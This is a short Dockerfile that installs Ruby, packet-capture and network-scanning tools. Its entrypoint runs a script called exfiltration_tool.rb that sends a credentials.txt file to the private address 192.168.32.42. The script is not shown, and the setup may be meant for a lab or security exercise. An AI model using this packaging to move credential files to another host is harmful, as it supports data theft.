FROM alpine:3.16.2

RUN apk update \
  && apk upgrade \
  && apk add --no-cache \
  ruby \
  ruby-dev \
  ruby-bundler \
  libpcap \
  libpcap-dev \
  build-base \
  net-tools \
  vim \
  arp-scan \
  tcpdump

ENV APP_HOME /app
RUN mkdir $APP_HOME

WORKDIR $APP_HOME

COPY Gemfile $APP_HOME/Gemfile
COPY Gemfile.lock $APP_HOME/Gemfile.lock
COPY exfiltration_tool.rb $APP_HOME/exfiltration_tool.rb
COPY credentials.txt $APP_HOME/credentials.txt

RUN chmod +x $APP_HOME/exfiltration_tool.rb
RUN bundle install

ENTRYPOINT ["bundle", "exec", "ruby", "/app/exfiltration_tool.rb", "192.168.32.42", "./credentials.txt"]
